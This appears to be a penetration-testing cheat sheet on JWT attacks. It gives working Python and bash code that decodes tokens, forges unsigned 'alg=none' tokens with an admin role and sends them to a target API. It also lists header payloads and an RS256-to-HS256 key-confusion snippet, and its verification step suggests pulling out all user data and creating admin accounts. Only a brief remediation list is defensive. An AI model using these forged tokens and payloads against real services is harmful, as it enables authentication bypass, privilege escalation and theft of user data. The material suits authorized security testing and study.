# JWT Attacks

## Summary
Exploit JSON Web Token implementation flaws to bypass authentication or escalate privileges.

## Detection

### Step 1: Intercept a Token
Capture JWT from:
- Login response body
- `Authorization: Bearer <token>` header
- Cookie (`token=eyJ...`)
- URL fragment

### Step 2: Decode (Base64)
```python
import base64, json

def decode_jwt(token):
    parts = token.split('.')
    for i, p in enumerate(parts[:2]):  # header + payload
        padded = p + '=' * (-len(p) % 4)
        print(f'Part {i}:', json.dumps(json.loads(
            base64.urlsafe_b64decode(padded)), indent=2))

decode_jwt("eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7...")
```

### Step 3: Test for `alg=none`

```python
import base64, json

def forge_none_jwt(payload, admin_role=True):
    if admin_role:
        payload = {**payload, 'role': 'admin'}
    header = base64.urlsafe_b64encode(
        json.dumps({'alg':'none','typ':'JWT'}).encode()
    ).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    return f'{header}.{payload_b64}.'

# Test it
forge_none_jwt({"data":{"email":"admin@target.com","role":"admin"}})
```

### Algorithm Confusion
Test with modified `alg` header:
- `none`: `{"alg":"none"}` — **HIGH SIGNAL**
- `None`: case variation
- `NONE`: case variation
- `HS256` when server expects `RS256` (use public key as HMAC secret)

### JWKS Injection
- If server fetches JWKS from `jku` or `jwk` header
- Host your own JWKS with your RSA keypair

## Practical Test Script

```bash
# 1. Get a real token
TOKEN=$(curl -s https://target.com/rest/user/login \
  -d '{"email":"test@test.com","password":"test123"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin).get('authentication',{}).get('token',''))")

# 2. Decode to see structure
python3 -c "
import base64,json,sys
parts = '$TOKEN'.split('.')
for i,p in enumerate(parts[:2]):
    padded = p + '=' * (-len(p) % 4)
    print(f'Part {i}:',json.dumps(json.loads(base64.urlsafe_b64decode(padded)),indent=2))
"

# 3. Forge alg=none admin token
ADMIN_JWT=$(python3 -c "
import base64,json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
# Match the EXACT payload structure the app uses
p = base64.urlsafe_b64encode(json.dumps({'data':{'role':'admin','email':'admin@target.com'}}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
")

# 4. Test it
curl -s https://target.com/api/Users -H "Authorization: Bearer $ADMIN_JWT"
# If returns data → CRITICAL: alg=none accepted
```

## Verification
If the forged `alg=none` token is accepted:
- Check higher-privilege endpoints
- Attempt data extraction of all users
- Check for write operations (create admin user)

## Payloads

```json
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
```

```python
# RS256 → HS256 with public key
import jwt
pub_key = open("public.pem").read()
token = jwt.encode({"sub":"admin","role":"admin"}, pub_key, algorithm="HS256")
```

## Remediation
- Reject tokens with `alg: none`
- Enforce algorithm whitelist on server
- Validate `kid` against trusted keys
- Use separate secrets per algorithm
